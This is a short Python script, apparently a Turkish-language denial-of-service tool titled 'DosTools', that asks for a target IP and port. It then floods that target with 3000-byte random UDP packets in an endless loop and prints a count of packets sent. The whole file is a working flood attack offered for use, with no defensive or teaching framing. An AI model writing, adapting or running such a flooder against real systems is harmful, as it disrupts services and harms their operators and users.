import socket
import random
import os
os.system('clear')
banner="""
###########################
# - ONE AND ZERO - 	  #
#     DosTools		  #
###########################			  

"""
print(banner)

hedef_ip=input("hedef ip:")
hedef_port=int(input("hedef port:"))

bytes=random._urandom(3000)
sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

sayac=0
while True:
	sock.sendto(bytes,(hedef_ip,hedef_port))
	sayac=sayac+1
	print("Saldiri baslatildi, gonderilen paket:%s"%(sayac))
print("toplam gonderilen paket:%s"(sayac))
    